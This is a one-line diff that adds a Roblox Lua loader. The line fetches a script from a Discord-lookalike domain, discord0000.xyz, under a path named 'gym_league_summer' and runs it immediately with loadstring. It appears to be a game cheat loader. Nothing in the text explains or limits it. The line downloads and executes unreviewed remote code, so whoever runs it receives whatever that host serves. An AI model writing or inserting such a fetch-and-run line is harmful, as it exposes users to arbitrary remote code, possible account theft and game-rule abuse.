@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://discord0000.xyz/scripts/gym_league_summer"))()
